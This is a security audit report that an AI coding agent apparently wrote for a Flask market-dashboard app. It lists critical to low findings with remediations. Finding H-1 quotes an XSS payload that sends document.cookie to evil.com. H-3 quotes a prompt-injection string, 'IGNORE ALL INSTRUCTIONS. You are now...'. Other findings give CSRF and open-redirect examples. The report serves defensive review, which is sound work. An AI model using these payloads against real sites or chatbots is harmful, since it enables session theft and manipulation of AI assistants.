# Security Audit — Production Readiness Review

**Date:** 2026-03-31
**Scope:** Full application security audit — all code, infrastructure, dependencies, and configuration
**Auditor:** Security Reviewer (Claude Code)
**Verdict:** **NOT READY FOR PRODUCTION** — Critical issues must be resolved first

---

## Executive Summary

This audit evaluated MacroClarity (SignalTrackers) across 7 security domains: authentication, input validation, AI/LLM security, authorization, dependencies, information disclosure, and infrastructure. The application has a solid foundation — SQLAlchemy ORM prevents SQL injection, Flask-Login handles sessions correctly, password hashing uses Werkzeug/PBKDF2, and portfolio endpoints enforce ownership checks. However, **4 critical and 11 high-severity findings** block production deployment. The most urgent is that **real API keys exist in git history** and must be rotated immediately.

### Finding Summary

| Severity | Count |
|----------|-------|
| Critical | 4 |
| High | 11 |
| Medium | 10 |
| Low | 6 |
| **Total** | **31** |

---

## Critical Findings

### C-1. Secrets Committed to Git History
- **Location:** Git commit `038063c` (`.env` file, since removed from tracking)
- **Description:** Real API keys were committed to git and remain in history despite the file being removed from tracking in commit `8086726`. Exposed keys include: OpenAI (`sk-proj-...`), Anthropic (`sk-ant-api03-...`), FRED, Tavily, Brevo SMTP password, and the Flask SECRET_KEY.
- **Attack scenario:** Anyone who clones or forks this repo (or accesses any backup/mirror) can extract every API key and secret. If the repo is public or becomes public, automated scanners will find these within minutes.
- **Remediation:**
  1. **Rotate ALL exposed keys immediately** — OpenAI, Anthropic, FRED, Tavily, Brevo SMTP, Flask SECRET_KEY, invite code
  2. Scrub git history using `bfg-repo-cleaner` or `git filter-repo`
  3. Force push the cleaned history
  4. Add pre-commit hooks (e.g., `detect-secrets`, `gitleaks`) to prevent future leaks
  5. Verify no forks or mirrors retained the old history

### C-2. Unauthenticated Unsubscribe Endpoints — IDOR
- **Location:** [dashboard.py:2365-2393](signaltrackers/dashboard.py#L2365-L2393)
- **Description:** `/unsubscribe/alerts/<int:user_id>` and `/unsubscribe/briefing/<user_id>` accept any user ID with no authentication or token verification. An attacker can disable any user's alerts or briefings by iterating through user IDs.
- **Attack scenario:** `GET /unsubscribe/alerts/1`, `GET /unsubscribe/alerts/2`, ... disables alerts for every user in the system. No auth, no rate limiting, no audit trail.
- **Remediation:** Implement HMAC-based unsubscribe tokens:
  ```python
  # Generate in email links:
  token = hmac.new(SECRET_KEY, f"{user_id}:alerts".encode(), sha256).hexdigest()
  url = f"/unsubscribe/alerts/{user_id}/{token}"

  # Verify on the endpoint:
  expected = hmac.new(SECRET_KEY, f"{user_id}:alerts".encode(), sha256).hexdigest()
  if not hmac.compare_digest(token, expected):
      abort(403)
  ```

### C-3. Unauthenticated Data Reload Endpoint
- **Location:** [dashboard.py:2884](signaltrackers/dashboard.py#L2884) — `POST /api/reload-data`
- **Description:** This endpoint spawns a background thread to run data collection with no authentication, no admin check, and no rate limiting. Any anonymous user can trigger expensive data collection operations repeatedly.
- **Attack scenario:** Attacker scripts `curl -X POST /api/reload-data` in a loop, spawning threads and exhausting server resources (CPU, memory, API rate limits on upstream data providers).
- **Remediation:** Add `@login_required` and `@admin_required` decorators. Add rate limiting (1 per 5 minutes).

### C-4. Debug Endpoint Leaks API Key Prefix
- **Location:** [dashboard.py:4497](signaltrackers/dashboard.py#L4497) — `GET /api/debug/web-search-status`
- **Description:** Unauthenticated endpoint returns `tavily_api_key_preview` containing the first 8 characters of the Tavily API key, plus boolean flags revealing which API keys are configured.
- **Attack scenario:** Attacker accesses the endpoint anonymously, learns which services are configured and gets a partial API key (reduces brute-force entropy).
- **Remediation:** Remove this endpoint entirely, or gate it behind `@admin_required` and remove the key preview field.

---

## High Findings

### H-1. XSS via Marked.js — Sanitization Disabled
- **Location:** [chatbot.js:52](signaltrackers/static/js/components/chatbot.js#L52), lines 293, 325
- **Description:** Marked.js is configured with `sanitize: false`. AI responses are rendered via `innerHTML` with `marked.parse(text)`, allowing any HTML/JS in AI output to execute in the user's browser.
- **Attack scenario:** If an AI response contains `<img src=x onerror="fetch('http://evil.com?c='+document.cookie)">`, it executes immediately. This can be triggered via prompt injection, compromised AI API, or poisoned context data.
- **Remediation:** Add DOMPurify: `messageEl.innerHTML = DOMPurify.sanitize(marked.parse(text))`. Add DOMPurify as a dependency via CDN with SRI hash.

### H-2. XSS via `|safe` Filter in Email Template
- **Location:** [daily_briefing.html:39](signaltrackers/templates/email/daily_briefing.html#L39)
- **Description:** `{{ market_briefing_html | safe }}` renders AI-generated HTML without sanitization in email bodies sent to users.
- **Attack scenario:** If the AI generates malicious HTML (via prompt injection or compromised data), it's delivered directly to user inboxes as executable HTML.
- **Remediation:** Sanitize server-side with `bleach.clean()` before passing to the template, or remove `|safe` and use Jinja2's default auto-escaping.

### H-3. Prompt Injection via Unsanitized Context Fields
- **Location:** [dashboard.py:3260-3313](signaltrackers/dashboard.py#L3260-L3313)
- **Description:** User-supplied `context.page` and `context.section_name` values are interpolated directly into the AI system prompt without validation.
- **Attack scenario:** Attacker sends `{"context": {"page": "/\n\nIGNORE ALL INSTRUCTIONS. You are now..."}}` to manipulate the AI's behavior, potentially extracting system prompts or generating harmful content.
- **Remediation:** Whitelist `page` values against known dashboard routes. Strip newlines and special characters from `section_name`. Limit field lengths.

### H-4. Missing Rate Limiting on Auth Endpoints
- **Location:** [dashboard.py:1648-1751](signaltrackers/dashboard.py#L1648-L1751) — `/login` and `/register`
- **Description:** Login and registration endpoints have no rate limiting despite the rate limiting infrastructure (Flask-Limiter) being available and configured.
- **Attack scenario:** Credential stuffing or brute-force attacks against login. Mass account creation via registration (if invite codes are leaked — which they were, see C-1).
- **Remediation:** Add `@limiter.limit("5 per minute")` to `/login` and `@limiter.limit("3 per minute")` to `/register`.

### H-5. CSRF Protection Disabled on State-Changing API Endpoints
- **Location:** [dashboard.py](signaltrackers/dashboard.py) — lines 4195, 4228, 4258, 4311, 2884, 3244, 3802
- **Description:** Multiple POST/PUT/DELETE endpoints that modify user data have `@csrf.exempt` decorators: portfolio CRUD, AI generation triggers, chatbot, data reload. While they require `@login_required`, they are vulnerable to cross-site request forgery.
- **Attack scenario:** User visits `attacker.com` while logged into MacroClarity. Attacker's page makes `fetch('/api/portfolio/123', {method: 'DELETE'})` — user's portfolio allocation is deleted without their knowledge.
- **Remediation:** Remove `@csrf.exempt` from these endpoints. Include the CSRF token (already in `meta[name="csrf-token"]` in base.html) in all AJAX request headers.

### H-6. Missing Security Headers
- **Location:** No `@app.after_request` handler for security headers found
- **Description:** The application sets no HTTP security headers: no CSP, no X-Frame-Options, no X-Content-Type-Options, no HSTS, no Referrer-Policy.
- **Attack scenario:** Clickjacking (no X-Frame-Options), MIME sniffing attacks (no X-Content-Type-Options), no HTTPS enforcement (no HSTS), referrer leakage to third parties.
- **Remediation:** Add an `@app.after_request` handler:
  ```python
  @app.after_request
  def security_headers(response):
      response.headers['X-Frame-Options'] = 'DENY'
      response.headers['X-Content-Type-Options'] = 'nosniff'
      response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
      response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
      response.headers['Content-Security-Policy'] = "default-src 'self'; ..."
      return response
  ```

### H-7. Raw Exception Messages Returned to Users
- **Location:** [dashboard.py](signaltrackers/dashboard.py) — lines 3746, 3765, 3783, 3801, 3819, 4191, 4224, 4254, and others
- **Description:** Multiple API endpoints return `{'error': str(e)}` which leaks internal exception details (file paths, library versions, DB schema info) to API consumers.
- **Attack scenario:** Attacker triggers errors intentionally to enumerate internal structure, database table names, library versions — aiding further attacks.
- **Remediation:** Log the full exception server-side (`app.logger.exception()`), return generic error messages to clients.

### H-8. Account Enumeration via Deactivation Message
- **Location:** [dashboard.py:1666-1668](signaltrackers/dashboard.py#L1666-L1668)
- **Description:** Login returns "This account has been deactivated" for deactivated accounts vs. "Invalid username or password" for non-existent accounts, allowing attackers to determine which accounts exist.
- **Remediation:** Return the same generic error for all failed login attempts.

### H-9. Open Redirect in Login
- **Location:** [dashboard.py:1674-1676](signaltrackers/dashboard.py#L1674-L1676)
- **Description:** The `next` parameter is validated only with `startswith('/')`, which can be bypassed with protocol-relative URLs like `//attacker.com`.
- **Remediation:** Use `urlparse()` to verify both `scheme` and `netloc` are empty (truly relative URL).

### H-10. Unpinned Dependencies
- **Location:** [requirements.txt](signaltrackers/requirements.txt)
- **Description:** Nearly all dependencies use `>=` specifiers. A compromised or buggy future release of any dependency gets pulled automatically on next build.
- **Remediation:** Pin to exact versions (`==`). Use `pip-compile` for a lockfile. Enable Dependabot for controlled updates.

### H-11. Unmaintained flask-mail Package
- **Location:** [requirements.txt](signaltrackers/requirements.txt) — `flask-mail==0.9.1`
- **Description:** Last updated in 2014. Over 10 years old with no security patches.
- **Remediation:** Migrate to `flask-mailman` (actively maintained drop-in replacement).

---

## Medium Findings

### M-1. System Prompts Written to Plaintext Files
- **Location:** [ai_summary.py:111-130](signaltrackers/ai_summary.py#L111-L130), [dashboard.py:3331-3370](signaltrackers/dashboard.py#L3331-L3370)
- **Description:** AI system prompts are dumped to `data/prompt_dumps/` in plaintext for debugging. These reveal internal AI instructions and tool definitions.
- **Remediation:** Disable in production with `if app.debug:` guard, or remove entirely.

### M-2. Docker Container Runs as Root
- **Location:** [Dockerfile](signaltrackers/Dockerfile) — no `USER` directive
- **Description:** Container processes run as root (UID 0). Container escape would grant root access to the host.
- **Remediation:** Add `RUN useradd -m -u 1000 appuser` and `USER appuser` before the `CMD`.

### M-3. No Session Lifetime Configured
- **Location:** [config.py:39-41](signaltrackers/config.py#L39-L41)
- **Description:** No `PERMANENT_SESSION_LIFETIME` set. Sessions persist indefinitely (or until browser close). Remember-me cookies have no explicit expiry.
- **Remediation:** Set `PERMANENT_SESSION_LIFETIME = timedelta(hours=24)` and configure remember-me cookie limits.

### M-4. Unvalidated Web Search Queries from AI
- **Location:** [web_search.py:16-46](signaltrackers/web_search.py#L16-L46)
- **Description:** AI-initiated web searches pass queries directly to Tavily with no validation. A prompt injection could cause the AI to search for attacker-controlled URLs or exfiltrate data via search queries.
- **Remediation:** Validate query length, reject URLs/IPs in queries, log all searches for audit.

### M-5. Uncontrolled AI Tool Iteration Cost
- **Location:** [ai_summary.py:189-273](signaltrackers/ai_summary.py#L189-L273)
- **Description:** AI can loop up to 6 iterations with web search tool calls per request. No per-request or per-user cost cap exists.
- **Remediation:** Reduce max iterations. Add per-request cost tracking. Enforce per-user hourly cost limits.

### M-6. Missing Email Format Validation
- **Location:** [dashboard.py:1692](signaltrackers/dashboard.py#L1692)
- **Description:** Registration accepts any string as an email with no format validation.
- **Remediation:** Use the `email-validator` library.

### M-7. Symbol Validation Endpoint — No Auth, No Rate Limit
- **Location:** [dashboard.py:4284](signaltrackers/dashboard.py#L4284) — `GET /api/portfolio/validate-symbol/<symbol>`
- **Description:** Unauthenticated, unlimited access to an endpoint that makes external yfinance API calls.
- **Remediation:** Add `@login_required` and `@limiter.limit("30 per minute")`.

### M-8. Excessive `print()` Statements in Production Code
- **Location:** Throughout `dashboard.py`, `ai_summary.py`, `scheduler.py`
- **Description:** 50+ `print()` statements output debug information to container stdout with no log levels.
- **Remediation:** Replace with Python `logging` module using appropriate levels.

### M-9. SameSite Cookie Set to Lax (Not Strict)
- **Location:** [config.py:41](signaltrackers/config.py#L41)
- **Description:** `SESSION_COOKIE_SAMESITE = 'Lax'` allows cookies on top-level navigations from external sites, which provides less CSRF protection than `Strict`.
- **Remediation:** Change to `'Strict'` if cross-site navigation to the app is not needed.

### M-10. No Missing Subresource Integrity (SRI) on CDN Resources
- **Location:** [base.html:9-10](signaltrackers/templates/base.html#L9-L10)
- **Description:** Bootstrap CSS/JS loaded from `cdn.jsdelivr.net` without SRI hashes. CDN compromise would inject malicious code.
- **Remediation:** Add `integrity="sha384-..."` and `crossorigin="anonymous"` attributes.

---

## Low Findings

### L-1. No Password Reset/Recovery Flow
- **Description:** Users who forget passwords have no self-service recovery option. Not a vulnerability today but becomes one as user count grows.

### L-2. Weak Invite Code Storage
- **Location:** [config.py:32](signaltrackers/config.py#L32)
- **Description:** Invite code stored as plaintext in environment variable. `hmac.compare_digest()` is correctly used (good), but the code itself is exposed if environment is compromised.
- **Remediation:** Store a hash of the invite code instead.

### L-3. System Status Endpoints Expose Internal State
- **Location:** `/api/reload-status`, `/api/scheduler-status`
- **Description:** Anonymous access to system operational state (scheduler timing, reload progress).
- **Remediation:** Add `@login_required` or `@admin_required`.

### L-4. SQLite in Production
- **Location:** [config.py:21-22](signaltrackers/config.py#L21-L22)
- **Description:** Default database is SQLite, which doesn't support concurrent writes well. Acceptable at current scale but will become a bottleneck.

### L-5. No HTTPS Redirect Enforcement
- **Description:** No automatic HTTP-to-HTTPS redirect in the application. Relies entirely on reverse proxy configuration.

### L-6. Session Storage for Conversation History
- **Location:** [chatbot.js:128-129](signaltrackers/static/js/components/chatbot.js#L128-L129)
- **Description:** Chatbot conversation history stored in unencrypted `sessionStorage`. On shared computers, the next user could see prior conversations.

---

## Positive Security Observations

These patterns are already done well and should be maintained:

1. **SQLAlchemy ORM throughout** — No raw SQL found. SQL injection risk is effectively zero.
2. **Password hashing** — Uses Werkzeug's `generate_password_hash()` / `check_password_hash()` (PBKDF2-SHA256).
3. **Invite code timing-safe comparison** — `hmac.compare_digest()` prevents timing attacks.
4. **Portfolio IDOR protection** — All portfolio CRUD filters by both `allocation_id` AND `user_id`.
5. **Alert ownership check** — `mark_alert_read` verifies `alert.user_id == current_user.id`.
6. **Stripe webhook signature verification** — Properly uses `stripe.Webhook.construct_event()`.
7. **HttpOnly session cookies** — Prevents JavaScript access to session tokens.
8. **Production SECRET_KEY enforcement** — `ProductionConfig` raises `ValueError` if SECRET_KEY is missing.
9. **Rate limiting infrastructure** — Flask-Limiter is configured and applied to AI generation endpoints.
10. **Admin decorator** — `@admin_required` properly gates admin endpoints.

---

## Remediation Roadmap

### Phase 1 — Before Deployment (Blockers)

| # | Finding | Effort |
|---|---------|--------|
| C-1 | Rotate all API keys, scrub git history | 2-3 hours |
| C-2 | Add token-based unsubscribe verification | 1-2 hours |
| C-3 | Gate `/api/reload-data` behind admin auth | 15 minutes |
| C-4 | Remove or protect debug endpoint | 15 minutes |
| H-1 | Add DOMPurify for marked.js output | 30 minutes |
| H-2 | Sanitize AI HTML in email templates | 30 minutes |
| H-4 | Add rate limiting to login/register | 15 minutes |
| H-6 | Add security headers via after_request | 30 minutes |
| H-7 | Replace `str(e)` with generic error messages | 1 hour |

### Phase 2 — First Week Post-Deploy

| # | Finding | Effort |
|---|---------|--------|
| H-3 | Sanitize prompt injection vectors in chatbot context | 1 hour |
| H-5 | Re-enable CSRF on API endpoints, update frontend | 2 hours |
| H-8 | Unify login error messages | 15 minutes |
| H-9 | Fix open redirect validation | 15 minutes |
| H-10 | Pin all dependencies | 1 hour |
| H-11 | Replace flask-mail | 1-2 hours |
| M-2 | Add non-root user to Dockerfile | 15 minutes |
| M-3 | Configure session lifetime | 15 minutes |

### Phase 3 — Ongoing Hardening

| # | Finding | Effort |
|---|---------|--------|
| M-1 | Disable prompt dumps in production | 15 minutes |
| M-4-M-10 | Remaining medium findings | 3-4 hours total |
| L-1-L-6 | Low findings | As time permits |
| — | Pre-commit secret scanning hooks | 1 hour |
| — | Dependency scanning in CI (Dependabot/Snyk) | 1 hour |
| — | Automated security testing (DAST) | 2-3 hours |

---

## Conclusion

The application demonstrates competent security practices in its core data layer (ORM, password hashing, ownership checks). The critical gaps are at the perimeter: **leaked secrets in git**, **unauthenticated endpoints that modify data**, **unsanitized rendering of AI output**, and **missing HTTP security headers**. Phase 1 remediation (~6-8 hours of engineering work) would bring the application to an acceptable security posture for a controlled, invite-only launch. The AI attack surface (prompt injection, cost abuse) warrants ongoing attention as the product scales.
